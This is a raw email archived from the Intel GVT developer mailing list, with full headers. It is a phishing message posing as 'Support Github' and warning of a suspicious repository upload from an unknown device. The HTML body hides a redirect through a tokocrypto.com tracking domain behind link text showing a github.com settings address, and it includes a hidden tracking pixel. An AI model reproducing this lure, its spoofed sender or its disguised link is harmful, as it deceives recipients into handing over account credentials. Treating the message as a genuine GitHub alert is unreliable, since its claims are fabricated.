Return-Path: <intel-gvt-dev-bounces@lists.freedesktop.org>
X-Original-To: lists+intel-gvt-dev@lfdr.de
Delivered-To: lists+intel-gvt-dev@lfdr.de
Received: from gabe.freedesktop.org (gabe.freedesktop.org [IPv6:2610:10:20:722:a800:ff:fe36:1795])
	by mail.lfdr.de (Postfix) with ESMTPS id 221EF4DA4FC
	for <lists+intel-gvt-dev@lfdr.de>; Tue, 15 Mar 2022 23:05:00 +0100 (CET)
Received: from gabe.freedesktop.org (localhost [127.0.0.1])
	by gabe.freedesktop.org (Postfix) with ESMTP id CE49A10E236;
	Tue, 15 Mar 2022 22:04:58 +0000 (UTC)
X-Original-To: intel-gvt-dev@lists.freedesktop.org
Delivered-To: intel-gvt-dev@lists.freedesktop.org
X-Greylist: delayed 304 seconds by postgrey-1.36 at gabe;
 Tue, 15 Mar 2022 22:04:57 UTC
Received: from wrqvnhqs.outbound-mail.sendgrid.net
 (wrqvnhqs.outbound-mail.sendgrid.net [149.72.32.70])
 by gabe.freedesktop.org (Postfix) with ESMTPS id 2310610E236
 for <intel-gvt-dev@lists.freedesktop.org>;
 Tue, 15 Mar 2022 22:04:57 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=tokocrypto.com;
 h=from:subject:mime-version:to:content-type:content-transfer-encoding;
 s=s1; bh=8kMvts5OvWfZa+Xu8lXa9wUpHuNK2/oNLjjgH6ZvuxU=;
 b=TC8yx3vj+wj4XkF5xqyQr5yz9jq3F0R0S1SMAC24qFELIG6eezTyQITFYqyezRZmAl1Z
 oJ6CvMG/Y6rRaVneGUVuDeWRfdL4jcXq87wkRq+RB46oky3H+W/Ttvo5poCBxEysH1TfHm
 JQCQ2uAbpMjJnojWyN61b4Q0MgwKzYrXSpqRt0xVuIhYd8OBzb9VTnuLCF17M6Ukfc5bij
 +hAUx7EDnZvI/HEdRCdioaNR3N7GMbI3a6aJwTugYJJRIxjemWkTrPNxRiLjMbtcldDzKV
 LPRkSkAsznb6icgUV78YPlO/bTEFL2Rf6jQzEDbL4CeRKr0ZfJmIIhcef13oNLzQ==
Received: by filterdrecv-7b47b46d4b-cvz56 with SMTP id
 filterdrecv-7b47b46d4b-cvz56-1-62310C58-83
 2022-03-15 21:59:52.905099686 +0000 UTC m=+16846736.568753293
Received: from maxko (unknown) by geopod-ismtpd-1-0 (SG) with ESMTP
 id pdx4ba8ZSMicvf5tk5IQ-g for <intel-gvt-dev@lists.freedesktop.org>;
 Tue, 15 Mar 2022 21:59:52.604 +0000 (UTC)
Date: Tue, 15 Mar 2022 21:59:52 +0000 (UTC)
From: Support Github <support@tokocrypto.com>
Subject: [Warning suspicious api usage]
Message-ID: <6be895a787669f75b7e13899bffe094a@maxko>
X-Mailer: PHPMailer 5.2.23 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
X-SG-EID: =?us-ascii?Q?=2F9KnH0m6klp+6c9sVsixfof6Gnd0dk92EU7zQCJMPMyMJyIHWbdwmfh2PXGoLv?=
 =?us-ascii?Q?6jokTh8kDDYowVbR3Fb4p2c1DXZ26lLsfV6e5by?=
 =?us-ascii?Q?4hunb21GdnfX9TQxZcIHKi=2F4RhJKrFv63ETmj0a?=
 =?us-ascii?Q?WoEiHSneGHipCRkdzTV5hwhk3KOLDurcuRx+zIy?=
 =?us-ascii?Q?FiNEBY4dcSf0KAiH6f7otqbOMEYtQYCWWCc9+xI?=
 =?us-ascii?Q?wGyLndQOztuESnjSLQVdZvZKhUxVWp4ntv69b4a?=
 =?us-ascii?Q?uVppRJYhmPnog2g2HAOQQ=3D=3D?=
To: intel-gvt-dev@lists.freedesktop.org
X-Entity-ID: pOj5zn8AgsUKCeyQbrpV5A==
Content-Type: multipart/alternative;
 boundary="b1_6be895a787669f75b7e13899bffe094a"
Content-Transfer-Encoding: 8bit
X-BeenThere: intel-gvt-dev@lists.freedesktop.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: "Intel GVT \(Graphics Virtualization\) development list"
 <intel-gvt-dev.lists.freedesktop.org>
List-Unsubscribe: <https://lists.freedesktop.org/mailman/options/intel-gvt-dev>, 
 <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=unsubscribe>
List-Archive: <https://lists.freedesktop.org/archives/intel-gvt-dev>
List-Post: <mailto:intel-gvt-dev@lists.freedesktop.org>
List-Help: <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=help>
List-Subscribe: <https://lists.freedesktop.org/mailman/listinfo/intel-gvt-dev>, 
 <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=subscribe>
Errors-To: intel-gvt-dev-bounces@lists.freedesktop.org
Sender: "intel-gvt-dev" <intel-gvt-dev-bounces@lists.freedesktop.org>

This is a multi-part message in MIME format.

--b1_6be895a787669f75b7e13899bffe094a
Content-Type: text/plain; charset=iso-8859-1
Content-Transfer-Encoding: 8bit

Review your account activity



On march 15, 2022 at 22:15(UTC) a file bas been uploaded

in your repository from "api.github.com".

On an unknown device please click on the link below to check the activity.

"http://url9810.tokocrypto.com/ls/click?upn=aLmEghmoxRJP-2F680gaYmGuALOd-2F7Hamb8NmuZmlKE-2Fty2OPsr5wg9ZIlu-2BKvUD4DXYLg-2Fi1AC0ZvUybZlEGKKo-2BsJDNfxgK4OX3dQi94zwsQm5Yl1pAweucFtGoLcN7YdwZpFLQAnCwTfsaQKKQIfw-3D-3DIc6p_mPBfdHdrbVENkhAsKCSHKEvklQcW-2FOAucTq3lqwsUj3fE5xFoYSYyNI3hLrf6jYjEm0Z8u1ITH85LIb7wt-2Fos-2FnASy5zqdpiZF1w0p1kggxSs5Z89p0kj13OG7F0uryG6gi8BLWVSFB9xakSWMchfpo1AsQLqn7q5vqsSd-2BelNPIrFN6SU5s1a-2F3RA9Q-2BziGnEnHloBL0jqpRm6B526Qc0MmiKc63E20x830qeM4X-2Bg-3D

 

 

 

 


--b1_6be895a787669f75b7e13899bffe094a
Content-Type: text/html; charset=us-ascii
Content-Transfer-Encoding: 7bit

<!doctype html>
<html>
<head>
	<title></title>
</head>
<body>
<h3>Review your account activity</h3>

<p></p>

<p>On march 15, 2022 at 22:15(UTC) a file bas been uploaded</p>

<p>in&nbsp;your repository from&nbsp;&quot;api.github.com&quot;.</p>

<p><span class="Y2IQFc" lang="en">On&nbsp;an unknown device please&nbsp;click on the link below to check the activity.</span></p>

<p style="text-align: center;">&quot;<a href="http://url9810.tokocrypto.com/ls/click?upn=aLmEghmoxRJP-2F680gaYmGnaCKiHYPtgaMPpLS3eteh9DEzN3TiDW2-2FozNNXOXsUAUgBxEHXvhuQ0qWJ2-2Ferhe-2FwK3oxFdoh0mNIBhBxb5nkq3ajArS-2F4v2uxZBfX7oiwrVIf_mPBfdHdrbVENkhAsKCSHKEvklQcW-2FOAucTq3lqwsUj3fE5xFoYSYyNI3hLrf6jYjEm0Z8u1ITH85LIb7wt-2Fos4owyVVhYuol7WFvXJEhVAsD-2FaRHhSxzDMJqBawZrOlxGVhjIpU2XIdok0GSXDmxSWJbKn62MJoYfPLEEt-2FEw-2F-2Fo9Z30-2FzlokHaTgrD6JWWFf3yipYjidvWoyBUo1wUU0QqOBbDON-2FCJ-2FIv71H9u7Fs-3D">https://github.com/settings/devices/</a>&quot;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>
<img src="http://url9810.tokocrypto.com/wf/open?upn=ec9KGMvd07MEkKq6og6XsZh-2BADXfFtrbLnpp89uy9K8iyIskL4pv8LbHTyiPxF3JhxpbWJdRTMepWHSmj3QHHn7ubvs7VYGRnKyBawBENl1qihOmb6RcTQMSuyqO0wCLLnnHmrXm2twUfSBT7gGCC5dEr898ycZ7jw7SmXl5MsimbpRZteO6jaD4lcqCWfsEc6dudM3p15pX2KkrhGtotYH5Cp7cIbgz65cJ6ywXeSWNrlm8rVB0n-2Ft2H7ihKodW" alt="" width="1" height="1" border="0" style="height:1px !important;width:1px !important;border-width:0 !important;margin-top:0 !important;margin-bottom:0 !important;margin-right:0 !important;margin-left:0 !important;padding-top:0 !important;padding-bottom:0 !important;padding-right:0 !important;padding-left:0 !important;"/></body>
</html>



--b1_6be895a787669f75b7e13899bffe094a--

